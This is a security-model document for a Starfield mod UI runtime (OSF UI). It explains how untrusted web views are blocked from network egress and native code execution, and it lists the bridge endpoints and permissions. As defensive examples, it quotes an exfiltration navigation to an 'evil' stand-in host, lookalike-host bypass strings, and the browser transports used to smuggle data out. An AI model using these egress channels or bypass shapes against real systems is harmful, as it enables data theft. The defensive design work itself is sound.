# Security Model

Component, view, and endpoint names follow the
[terminology glossary](terminology.md).

## Threat model

Views (HTML/CSS/JS) are mod content downloaded from the internet. Every view is treated as untrusted code running next to the game process with a native plugin attached. The OSF UI runtime's goal is that a hostile view can at worst draw an ugly overlay, never execute native code.

## Renderer posture

OSF UI uses the out-of-process browser host. Views run in full Chromium at
`https://osfui.local/…`, mapped to the shared views root. The browser host installs a
default-deny egress guard per view (rule 2 below): http(s) requests outside
`osfui.local` are answered locally with 403, and the channels the request filter
cannot see (WebSocket/WebRTC/WebTransport, plus `Worker`/`SharedWorker` — the one
scope those transports could otherwise be reached from) have their constructors
removed from every document.

The controls that prevent a hostile view from executing native code are the
native bridge rules below. Chromium lives in a separate
`osfui_webview2_host.exe` process; that boundary reduces renderer failure impact
but is not a substitute for validating bridge messages. The OSF UI runtime creates the first
owner-only named-pipe instance before launching the browser host, then checks
`GetNamedPipeClientProcessId` against the hello PID. The browser host independently checks
`GetNamedPipeServerProcessId` against `--game-pid`. A same-user process therefore cannot
win a pipe-name race and impersonate either trusted peer.

One structural mitigation applies to the built-in views only: their only tracked
implementation is `frontend/src/`. CI builds that source and runs the output
security/shape gates on every push; the generated bundles under
`build/frontend/views/` are ignored build output and cannot be edited into a
release independently of source. This says nothing about third-party views.

## Rules

Each rule notes where it is enforced and any known gaps.

1. **JS is untrusted.** Nothing a view sends is executed, evaluated, or used as a format string natively. Bridge input is parsed defensively: non-throwing JSON parse, typed accessors with defaults, length-bounded logging. Content-supplied strings that get echoed back onto the wire (endpoint names, error messages) are truncated on a **codepoint** boundary, not a byte boundary: they are re-serialized inside the outbound envelope, nlohmann's `dump()` throws on a split UTF-8 sequence, and the web-message callback runs with nothing between it and `std::terminate`. Enforced in `MessageBridge` / `Json` / `StringUtil`.

2. **No network, enforced default-deny.** The per-view `permissions.network` flag is recognized but force-disabled with a warning (`ViewManifest`), and the browser host enforces the deny with two mechanisms, because no single one covers everything (`InstallNetworkGuard` in `tools/webview2_host/HostApp.cpp`):

   - A `WebResourceRequested` filter answers every http(s) request outside the `osfui.local` virtual host locally with 403 — documents (**including top-level frame navigations**: `location = 'https://evil/?data'` is denied before any packet leaves), `fetch()`/XHR, media, SSE, images/scripts/`sendBeacon`, and (via the source-kinds registration, standard on current Evergreen runtimes) worker-initiated fetches. The check requires `/` or end-of-string immediately after the host, so `osfui.local.evil.com` and `osfui.local@evil.com` lookalikes are denied. Denials are logged warn-once per view+origin.
   - `WebResourceRequested` cannot see non-HTTP transports (WebView2 raises no event for WebSocket/WebTransport handshakes), so a document-created script removes their entry points — `WebSocket`, `RTCPeerConnection` (+`webkit` alias), `WebTransport` — as non-configurable `undefined` in every document, iframes included (`about:blank` child realms confirmed covered, so the constructor cannot be borrowed from a synthetic child frame).
   - The same document-created script also removes `Worker` and `SharedWorker`. A Web Worker is the one scope the two mechanisms above can't reach: the neuter script does not run in worker global scopes, and a worker loaded from a network URL derives its CSP from its own script response, which WebView2's folder mapping serves internally without ever raising `WebResourceRequested` (so a per-response CSP header is not an option). Removing the worker constructors eliminates that scope entirely. Views are local, no-network mod UIs and none use workers; service workers are structurally different (no `WebSocket` in their scope, and their fetches are already caught by the request filter), so they are left alone.

   The intended egress channels were probed end-to-end against a live browser host (WebView2 Runtime 150.0.4078.83) and all are closed: a dedicated worker can no longer be constructed (`Worker`/`SharedWorker` are `undefined` in the document and in child iframes; `new Worker(...)` throws), document transports are `undefined`, `about:blank`-iframe transports are `undefined`, a main-frame navigation to an external URL is blocked before any packet leaves, and remote `fetch()` (document and — before neutering removed the scope — worker) is 403'd. RTCPeerConnection is not exposed in workers regardless. Residual note: this is JS-surface enforcement, which matches the threat model (untrusted *view JS*); it is not a defense against a compromised Chromium renderer, for which the separate browser-host process is the containment boundary.

   `devMode` is deliberately not exempt (harness development happens in a desktop browser, not in-game). `target="_blank"` links still open in the OS default browser via `NewWindowRequested` — the WebView itself never fetches them — but only from a real user gesture: a scripted `window.open` is dropped (warn-once), since it would otherwise be an egress channel this filter never sees. On an older WebView2 Runtime without source-kind filtering, the filter degrades to documents/fetch/XHR and logs the gap.

3. **No local filesystem access beyond the views root.** `SetVirtualHostNameToFolderMapping` exposes exactly the shared views folder under `osfui.local`; nothing else on disk is mapped. Manifest `entry` validation separately rejects paths that escape a view folder. Because every view shares one mapped root, a view can read a sibling view's assets; strict per-view isolation would require separate mappings or request filtering.

4. **No process execution.** No bridge endpoint spawns processes, and none is planned.

5. **No arbitrary native bridge.** A view can send exactly two envelope kinds, and each one dispatches through an **explicit, name-keyed registry** — there is no generic "call native", no eval, no reflection, and no view message that supplies a function name. Enforced in `MessageBridge::HandleWebMessage` / `DispatchSend` / `DispatchRequest`.

   The registry is split by kind, and the split is itself a control. A `send` is a pure notification with nothing to settle; a `request` carries a caller-chosen id and settles exactly once. A `request` naming a send endpoint is rejected `wrong-endpoint-kind`, and a `send` naming a request endpoint is **dropped** — never quietly executed as if the caller had asked correctly, because running a mutation whose kind the caller got wrong is how the interesting bugs start. Native ABI 1.9 exposes the same strict split through `RegisterSend` and `RegisterRequest`. An `id` on a `send` is a hard `invalid-request` rather than a silent demotion, ids are bounded to 1–64 characters, and a payload that is present but not an object is refused rather than coerced.

   The platform endpoint set is small enough to list. Sends (one-way): the handshake
   `osfui.hello` (answered by the bridge itself, not by a registered handler),
   view control `close` / `setVisible`, `log`, the per-view
   input-routing declarations `osfui.gamepadRaw` / `osfui.handleBack`, the
   direct GLOBAL Papyrus dispatch `papyrus.call`, and owning-mod Papyrus delivery
   `papyrus.send`. Requests (settle payload-or-error): view control
   `menu.open` / `menu.close` / `setViewHidden`, liveness `ping`, the settings writes `settings.set` / `settings.reset` /
   `settings.captureKey`, correlated Papyrus delivery `papyrus.request`, the
   platform-private startup-policy write `osfui.setViewAutoStart`.

   Everything not in that list, and every endpoint a plugin has not registered,
   is refused: a request gets `unknown-endpoint`, a send is dropped, and both
   land in the log as `[content]` warnings — one per occurrence naming the view
   and the code, plus one explanatory line per endpoint name (warn-once, capped
   at 512 distinct names). The read side of the 1.x surface — `settings.get`,
   `views.get`, `i18n.get`, and `diagnostics.get` — no longer exists as endpoints at
   all; those registries are pushed as state keys instead (rule 8), so there is
   nothing to call and nothing to guess.

   Eight qualifications:

   - A separate trusted native SFSE plugin can register additional endpoints via the exported `OSFUI_RequestBridge` API (`docs/native-plugin-api.md`): `RegisterSend` claims a strict one-way endpoint, while `RegisterRequest` claims an explicitly settled request endpoint. Mod ids and endpoint names are opaque, so ownership is not inferred from dot count. `BridgeApi` explicitly refuses the current platform endpoints and the case-insensitive `osfui` / `osfui.*` namespace. Duplicate registrations are refused first-wins **across all endpoint registries**, so an already-claimed name cannot be hijacked or shadowed as another kind. The frozen `RegisterCommand` path retains its published request-id/auto-ack behavior without changing the authority checks. This widens the surface only by what a mod author's own DLL deliberately exposes; untrusted JS still cannot register anything, and validating each added endpoint is that plugin's responsibility. Unrelated ABI majors are refused.

   - `papyrus.call` deliberately gives a bridge-enabled installed view authority to name any Papyrus script and GLOBAL function. This is a local-content capability: remote navigation and network egress remain blocked, and a view without `permissions.nativeBridge` has no bridge at all. Script/function identifiers are grammar- and length-validated; calls accept at most 32 scalar arguments, with JavaScript integers/floats/strings/booleans mapped to the matching Papyrus types (the sole object shape is the explicit-float tag minted by the shared bridge helper). Calls are fire-and-forget and expose neither game objects nor a return-value callback. A missing PEX, function, or signature mismatch fails in the VM rather than invoking a fallback target.

     Two consequences follow from "any script", and both are deliberate:

     - **OSF UI's own `OSFUI` script is refused** (case-insensitively, `forbidden`). Its natives take the target mod id as an ARGUMENT and trust their caller, because Papyrus is a mod's own code — so reaching them from a page would be a trusted alias for `settings.set`, `settings.reset` and state publishing *without* the write-authority check those endpoints enforce. A view that needs a platform operation calls the platform endpoint, which checks who is asking.
     - **The vanilla script library is in scope**, including `Debug.ExecuteConsole(string)`. A view granted `nativeBridge` can therefore run console commands, which is strictly more authority than "call my mod's functions". This is the same trust level a player already extends to any SFSE plugin, and it is why the grant is scoped to *installed, local* content: it is not a sandbox boundary, and a view that funnels remote or player-supplied text into `papyrus.call` has escalated that text to game-process authority. Treat arguments to `papyrus.call` as you would arguments to a shell.

   - `papyrus.send` and `papyrus.request` retain the narrower owning-mod listener path. The owning mod comes from the trusted source view path and is never accepted from the message payload. Correlated requests keep bounded inflight capacity, OSF UI runtime-minted one-shot reply tokens, a fixed timeout, and session teardown. `SetView*` and replies serialize form identities rather than exposing native objects.

   - Only the settings endpoints write, and only schema-bounded values. `settings.set` can only set a key that exists in the mod's schema, to a value the `SettingsStore` validates and clamps to that key's declared type and range: enums must be one of the declared options, numbers are clamped to [min, max], strings and key names are length-bounded, and `flags` arrays are filtered to declared options. `settings.reset` restores declared defaults. `settings.captureKey` arms a one-shot key capture, and only for a setting the schema declares as `type:"key"`; the captured name is validated like any other set. A refusal is a **rejection** carrying its code (`forbidden`, `unknown-setting`, `invalid-value`, `capture-busy`, `not-rebindable`), not a resolved `{ ok:false }` document a caller could forget to inspect.

     A write also has to be **addressed** to a mod the caller may write. The target mod arrives in the payload, so `settings.set`, `settings.reset` and `settings.captureKey` each resolve it through `Ids::ResolveWritableMod` before touching the store: a view may only name its own mod (derived from the trusted source view id, as `papyrus.send` does), and a mismatch is refused with `forbidden` having committed nothing. An omitted `mod` resolves to the caller's own — the field carries no authority for a third-party view either way. Only the two built-in editor views, `osfui/settings` and `osfui/keybinds`, may name a foreign mod, because editing other mods' settings is precisely their job; the check is an exact qualified-id match rather than an `osfui/` prefix test because reserving that mod namespace does not make every possible built-in document a settings editor. Without this, any view holding `nativeBridge` could rewrite every installed mod's values — including OSF UI's own `toggleKey`, which is the escape hatch the input layer depends on.

     So untrusted JS cannot write arbitrary keys, out-of-range values, or another mod's settings. Enforced in `Ids::ResolveWritableMod` (native-tested in `tests/native/settings_module_tests.cpp`) plus `SettingsStore::Validate` / `SetValueWithResult`.

   - A key setting may declare `onPress: {script,function}` in its installed, read-only schema. This is a mod-author capability at the same trust level as the mod's `.pex`: after the existing gameplay hotkey gates pass, OSF UI queues that named GLOBAL function with the fixed `(string modId, string key)` argument shape. The target is validated and read from the schema at delivery, never copied to the writable values document, never accepted from `settings.set`, and never taken from a view message. An untrusted view can rebind the key only when the addressed-write rules above authorize it; it cannot choose what code the key invokes. Malformed or missing targets fail closed while ordinary hotkey delivery continues.

   - Two sends let a view take input the framework would otherwise handle: `osfui.gamepadRaw` suppresses the default gamepad nav mapping, and `osfui.handleBack` redirects Esc / gamepad B into the page as a synthetic Escape instead of closing the active menu. Both are sticky per view and neither can be asserted on another view's behalf. They clear on view destroy **and on every greeting**, so a fresh document starts with no grants even when the OSF UI runtime was never told the page reloaded (a raw F5). The bound on abuse is deliberate and native: the overlay toggle key always closes the overlay in the input layer, so a view that grabs back and then stops responding cannot strand the player.

   - The compatibility-named `osfui/diagnostics` state is native-authored and sanitized outbound. `HealthRegistry` drops structured context values, bounds key count and string length, and reduces path-, URL-, or command-shaped strings to their trailing component. Player-facing copy and actions come from a closed built-in code catalog, so a plugin cannot inject UI controls through `ReportIssue`. System Health offers only local display, safe retry, and copying the already-visible detail block; it has no report serializer, upload/submission endpoint, log-folder action, URL opener, or native HTTP client.

   - OSF UI runtime-detected protocol misuse is reported **back to the offending view** as an `osfui.debug.error` event, and only in developer mode (`Runtime::OnProtocolFault`). This is a debugging affordance, not a capability: the payload is bounded native text about the caller's own mistake and is delivered to no one else; repeated misuse raises a bounded local System Health issue while release builds keep each rejection in the native log. It does tell a developer-mode page whether a name it guessed exists; so does the `unknown-endpoint` rejection a request already gets in every build (see *Future hardening*).

6. **Per-view permissions** (`nativeBridge`, `filesystem`, `network`) default to deny in the manifest parser. Today `nativeBridge=false` prevents bridge creation, blocks the `window.osfui` injection for that view, and drops any outbound send targeting it; finer-grained, per-endpoint grants come later. Partially enforced.

7. **Clipboard follows Chromium's gesture rules.** There is no OSF UI bridge endpoint for clipboard access. In-page copy, cut, paste, the async Clipboard API, and System Health's user-triggered **Copy details** action are handled by Chromium; OSF UI does not log or independently gate them. A user paste can disclose sensitive clipboard text to a view, and per-view clipboard gating remains future hardening.

8. **Outbound delivery is addressed, not subscribed.** 2.0 pushes state and events instead of answering `*.get` reads, so "what a view may *receive*" is now as much a part of the model as what it may call. Nothing a view sends can widen that set — there is no subscribe message.

   - **Retained mod state** from Papyrus `SetView*` or native `SetViewState` is scoped by the publishing mod id: it reaches that mod's instantiated documents and is replayed to its future documents. A Papyrus `SendViewEvent` reaches only that mod's currently instantiated views and is dropped when there are none. Native `SendToWeb` instead addresses one explicit qualified view id and has a bounded pre-instantiation holdback. No message from a page subscribes it to another address or widens any of these delivery sets.
   - **`osfui/i18n`** is computed per view and carries only the catalog of that document's owning mod.
   - **`osfui/settings`, `osfui/views`, `osfui/diagnostics`, `osfui/keybindings`, and `osfui/input-context`** go to every instantiated bridge-enabled view. The diagnostics document contains only the sanitized health snapshot described above. The input documents expose only Starfield's read-only action catalog and active context names; they grant no remap or input authority. `osfui/settings` is the whole registry — every installed mod's schema and values — so any bridged third-party view can read every mod's settings. This is an information-disclosure gap, not a write path, and 2.0 made it *broader* than 1.x's `settings.get`, because the document now arrives unasked at every greeting. It is listed under future hardening below and is the main reason to keep sensitive values out of settings.
   - A document that has not greeted the bridge receives nothing: events queue behind its gate (bounded 64, oldest dropped), state is dropped outright because the greeting replay carries every current value anyway. Destroying a view drops the gate and reaps its in-flight requests, so nothing is retained for a page that is gone.

## Future hardening

- **A `connect-src 'self'` CSP response header** as a second, renderer-enforced egress layer behind rule 2's request filter and constructor neutering. This is now belt-and-suspenders, not a required closer (the `Worker`/`SharedWorker` removal already eliminates the only scope the other two layers missed). It is non-trivial to add: WebView2 does not raise `WebResourceRequested` for folder-mapped content, so injecting a response header would mean replacing `SetVirtualHostNameToFolderMapping` with hand-rolled static serving (MIME types, range requests) — deferred until there is a reason to reintroduce workers or otherwise want CSP depth. If workers are ever reintroduced, this becomes required again.
- **Scope the settings registry per view.** Writes are addressed-checked (rule 5's settings bullet), but every bridged view is *handed* the whole `osfui/settings` document at every greeting, plus a `settings.changed` event for every mod's every commit. Closing it means projecting `SettingsStore::DataView` (and the change fan-out) down to the caller's own mod while the two built-in editor views keep the full document — the same editor/non-editor split `Ids::ResolveWritableMod` already draws, applied to the outbound side.
- Per-view clipboard gating (rule 7), especially for passive HUD views.
- Message flooding is bounded but not shaped. The browser host already drops a page message over 64 KiB and anything past 128 messages/second per view (warn-once each); every queue in front of a page caps at 64 entries (the bridge's per-view event gate, the ABI's per-view send holdback, the renderer's pending-web queue) and a view may hold at most 64 in-flight requests. What is missing is cost-awareness: `osfui.hello` is unauthenticated by design (any document may re-greet), and each greeting re-serializes the platform registries for that view, so a page can spend the OSF UI runtime's main-thread budget within its rate allowance. A per-view greeting throttle is the cheap fix.
- Log text is truncated at 512 chars; generalize bounded logging to every content-supplied string that reaches the log rather than doing it per call site.
- Versioned bridge API so views cannot probe for undocumented endpoints. Partially done: `ready` carries the web bridge protocol `bridgeVersion` (and the OSF UI release `version`), and an unknown *send* is silent in release builds. The remaining gap is that an unknown *request* still answers `unknown-endpoint` in every build, which is enough to enumerate what exists.
